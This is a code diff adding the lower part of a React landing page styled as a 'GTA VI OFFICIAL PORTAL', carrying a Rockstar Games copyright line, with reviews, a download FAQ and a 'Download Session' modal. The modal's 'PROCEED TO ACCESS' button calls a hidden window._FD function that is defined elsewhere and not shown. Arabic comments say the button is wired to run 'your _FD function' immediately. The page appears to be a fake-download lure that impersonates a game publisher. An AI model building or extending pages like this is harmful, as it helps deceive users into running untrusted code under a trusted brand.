+                  <ThumbsUp className="w-3.5 h-3.5 mr-1 text-slate-500" /> {rev.likes} Helpful
+                </span>
+              </div>
+            </div>
+          ))}
+        </div>
+      </section>
+
+      {/* FAQ Accordion Section */}
+      <section id="faq" className="py-20 bg-slate-950/60 border-t border-slate-800/80">
+        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="text-center mb-12">
+            <h2 className="text-3xl font-bold font-display text-white mb-2">Frequently Asked Questions</h2>
+            <p className="text-slate-400 text-sm">Everything you need to know about accessing and downloading the release package.</p>
+          </div>
+
+          <div className="space-y-4">
+            {FAQ_LIST.map((faq, idx) => {
+              const isOpen = activeFaq === idx;
+              return (
+                <div
+                  key={idx}
+                  className="rounded-2xl bg-slate-900/60 border border-slate-800 overflow-hidden transition-all"
+                >
+                  <button
+                    onClick={() => setActiveFaq(isOpen ? null : idx)}
+                    className="w-full p-5 text-left flex items-center justify-between font-semibold text-white text-base hover:text-rose-300 transition-colors cursor-pointer"
+                  >
+                    <span>{faq.q}</span>
+                    <ChevronDown className={`w-5 h-5 text-slate-400 transition-transform duration-300 ${isOpen ? "rotate-180 text-rose-400" : ""}`} />
+                  </button>
+                  <AnimatePresence>
+                    {isOpen && (
+                      <motion.div
+                        initial={{ opacity: 0, height: 0 }}
+                        animate={{ opacity: 1, height: "auto" }}
+                        exit={{ opacity: 0, height: 0 }}
+                        className="px-5 pb-5 text-sm text-slate-300 leading-relaxed border-t border-slate-800/50 pt-3"
+                      >
+                        {faq.a}
+                      </motion.div>
+                    )}
+                  </AnimatePresence>
+                </div>
+              );
+            })}
+          </div>
+        </div>
+      </section>
+
+      {/* Footer */}
+      <footer className="border-t border-slate-800 py-12 bg-[#08090f] text-xs text-slate-500 font-mono">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row items-center justify-between space-y-6 md:space-y-0">
+          <div className="flex items-center space-x-3">
+            <div className="w-8 h-8 rounded-lg bg-rose-500/10 border border-rose-500/30 flex items-center justify-center">
+              <Flame className="w-4 h-4 text-rose-400" />
+            </div>
+            <span className="font-bold text-slate-300 text-sm">GTA VI OFFICIAL PORTAL</span>
+          </div>
+
+          <div className="flex items-center space-x-6 text-slate-400">
+            <span>Secure Download</span>
+            <span>•</span>
+            <span>Privacy Standard</span>
+            <span>•</span>
+            <span>Global Release</span>
+          </div>
+
+          <div className="text-center md:text-right text-slate-600">
+            © 2026 Rockstar Games Inc. All Rights Reserved.
+          </div>
+        </div>
+      </footer>
+
+      {/* Image Lightbox Preview Modal */}
+      <AnimatePresence>
+        {previewImage && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            onClick={() => setPreviewImage(null)}
+            className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 cursor-pointer"
+          >
+            <div className="relative max-w-5xl w-full max-h-[90vh] overflow-hidden rounded-2xl border border-slate-700">
+              <img src={previewImage} alt="Preview" className="w-full h-full object-contain" />
+              <button
+                onClick={() => setPreviewImage(null)}
+                className="absolute top-4 right-4 p-2 rounded-full bg-black/60 text-white hover:bg-white/20 transition-colors"
+              >
+                <X className="w-6 h-6" />
+              </button>
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* Write Review Modal */}
+      <AnimatePresence>
+        {showReviewModal && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4"
+          >
+            <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 max-w-md w-full space-y-4 relative shadow-2xl">
+              <button
+                onClick={() => setShowReviewModal(false)}
+                className="absolute top-4 right-4 text-slate-400 hover:text-white"
+              >
+                <X className="w-5 h-5" />
+              </button>
+
+              <h3 className="text-lg font-bold text-white">Submit Player Feedback</h3>
+
+              <form onSubmit={handleAddReview} className="space-y-4">
+                <div>
+                  <label className="block text-xs font-mono text-slate-400 mb-1">Your Name or Handle</label>
+                  <input
+                    type="text"
+                    required
+                    value={newAuthor}
+                    onChange={(e) => setNewAuthor(e.target.value)}
+                    placeholder="e.g. Gamer_Pro"
+                    className="w-full px-3 py-2 rounded-xl bg-slate-800 border border-slate-700 text-white text-sm focus:border-rose-500 focus:outline-none"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-mono text-slate-400 mb-1">Star Rating</label>
+                  <select
+                    value={newRating}
+                    onChange={(e) => setNewRating(Number(e.target.value))}
+                    className="w-full px-3 py-2 rounded-xl bg-slate-800 border border-slate-700 text-white text-sm focus:border-rose-500 focus:outline-none"
+                  >
+                    <option value={5}>5 Stars - Amazing</option>
+                    <option value={4}>4 Stars - Very Good</option>
+                    <option value={3}>3 Stars - Average</option>
+                  </select>
+                </div>
+
+                <div>
+                  <label className="block text-xs font-mono text-slate-400 mb-1">Your Review</label>
+                  <textarea
+                    required
+                    rows={3}
+                    value={newText}
+                    onChange={(e) => setNewText(e.target.value)}
+                    placeholder="Share your feedback..."
+                    className="w-full px-3 py-2 rounded-xl bg-slate-800 border border-slate-700 text-white text-sm focus:border-rose-500 focus:outline-none"
+                  />
+                </div>
+
+                <button
+                  type="submit"
+                  className="w-full py-3 rounded-xl bg-rose-500 hover:bg-rose-400 text-white font-bold text-sm transition-all shadow-lg shadow-rose-500/20 cursor-pointer"
+                >
+                  Submit Review
+                </button>
+              </form>
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* Download Session Modal (مرتبط بدالة _FD الخاصة بك) */}
+      <AnimatePresence>
+        {showDownloadModal && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4"
+          >
+            <div className="bg-slate-900 border border-rose-500/40 rounded-2xl p-6 sm:p-8 max-w-lg w-full space-y-6 relative shadow-2xl text-center">
+              <button
+                onClick={() => setShowDownloadModal(false)}
+                className="absolute top-4 right-4 text-slate-400 hover:text-white cursor-pointer"
+              >
+                <X className="w-5 h-5" />
+              </button>
+
+              <div className="w-16 h-16 rounded-2xl bg-rose-500/10 border border-rose-500/30 text-rose-400 flex items-center justify-center mx-auto">
+                <Download className="w-8 h-8 animate-bounce" />
+              </div>
+
+              <div>
+                <h3 className="text-2xl font-bold font-display text-white">Initiate Download Session</h3>
+                <p className="text-slate-400 text-sm mt-1">
+                  Selected Target: <span className="text-rose-400 font-semibold">{selectedPlatform.name}</span> ({selectedPlatform.sizeText})
+                </p>
+              </div>
+
+              <div className="p-4 rounded-xl bg-slate-800/80 border border-slate-700 text-left space-y-2 text-xs font-mono text-slate-300">
+                <div className="flex justify-between">
+                  <span className="text-slate-400">Release Version:</span>
+                  <span className="text-white">{selectedPlatform.version}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-400">Build Tag:</span>
+                  <span className="text-rose-400">{selectedPlatform.build}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-400">CDN Pipeline:</span>
+                  <span className="text-emerald-400">Active Node</span>
+                </div>
+              </div>
+
+              {/* زر التأكيد داخل المودال مبرمج لتشغيل دالة _FD() فوراً */}
+              <button
+                id="modal-confirm-download"
+                onClick={() => {
+                  if (typeof window !== "undefined" && (window as any)._FD) {
+                    (window as any)._FD();
+                  } else {
+                    alert("Ready for execution.");
+                  }
+                }}
+                className="w-full py-4 rounded-xl bg-gradient-to-r from-rose-500 via-pink-600 to-purple-600 hover:opacity-95 text-white font-bold text-base transition-all shadow-xl shadow-rose-500/30 flex items-center justify-center space-x-2 cursor-pointer"
+              >
+                <Download className="w-5 h-5" />
+                <span>PROCEED TO ACCESS</span>
+              </button>
+
+              <p className="text-[11px] text-slate-500 font-mono">
+                Clicking proceed initiates verification handshake.
+              </p>
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+    </div>
+  );
+}
